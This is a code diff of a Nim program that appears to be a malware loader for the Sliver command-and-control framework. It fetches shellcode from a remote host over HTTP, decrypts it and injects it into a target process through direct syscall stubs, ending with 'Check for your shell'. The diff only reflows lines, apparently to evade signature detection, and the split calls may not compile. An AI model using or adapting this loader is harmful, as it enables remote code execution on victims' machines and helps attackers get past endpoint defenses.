@@ -95,13 +95,15 @@ when isMainModule:
             var client = newHttpClient()
             var url = "http://" & $paramStr(4) & ":" & $paramStr(5) & "/" & $paramStr(6)
             var response: string = client.getContent(url) 
-            shellcode = toByteSeq(response)
+            shellcode = 
+            toByteSeq(response)
 
             #If Sliver remove the iv from first 16 bytes
             if ($paramStr(1) == "sliver"):                 
                 for i in 16  ..< shellcode.len:
                     actual.add(shellcode[i])
-                shellcode = decrypt(actual,key,iv)                   
+                shellcode = 
+                decrypt(actual,key,iv)                   
             runShellcode(shellcode)      
         
         #Download the payload over smb  
@@ -168,15 +170,23 @@ proc runShellcode(shellcode: seq[byte]): void =
     var success: BOOL
     var bytesWritten: SIZE_T
 
-    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
-    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
-    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
-    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
+    success = GetSyscallStub
+    ("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
+    success = GetSyscallStub
+    ("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
+    success = GetSyscallStub
+    ("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
+    success = GetSyscallStub
+    ("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
     
-    status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS, &oa, &cid)
-    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
-    status = NtWriteVirtualMemory(pHandle, ds, shellcode[0].addr, sc_size-1, addr bytesWritten);
-    status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle,ds, NULL, FALSE, 0, 0, 0, NULL);
+    status = NtOpenProcess
+    (&pHandle,PROCESS_ALL_ACCESS, &oa, &cid)
+    status = NtAllocateVirtualMemory
+    (pHandle, &ds, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+    status = NtWriteVirtualMemory
+    (pHandle, ds, shellcode[0].addr, sc_size-1, addr bytesWritten);
+    status = NtCreateThreadEx
+    (&tHandle, THREAD_ALL_ACCESS, NULL, pHandle,ds, NULL, FALSE, 0, 0, 0, NULL);
 
     echo "Finished: Check for your shell after a few seconds"
     WaitForSingleObject(tHandle, -1)
